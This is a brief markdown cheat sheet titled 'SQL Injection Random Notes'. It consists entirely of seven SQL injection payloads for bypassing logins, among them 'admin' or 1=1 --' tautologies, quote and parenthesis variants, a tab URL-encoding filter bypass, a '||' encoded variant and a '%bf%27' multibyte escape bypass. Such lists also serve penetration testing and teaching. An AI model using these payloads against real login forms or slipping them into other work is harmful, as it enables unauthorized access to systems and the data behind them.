## SQL Injection Random Notes

-  admin' or 1=1 -- 
-  admin" or 1=1 -- 
-  ") or ("1"="1
-  admin' or 1=1  limit 1 -- 
-  URL encoding bypass of tab (HT, \t) . admin'%09or%091=1%09--%09
-  admin%27||1%3D1#
-  '\xBF'(URL-encoded as %bf%27) : %bf%27 or 1=1 --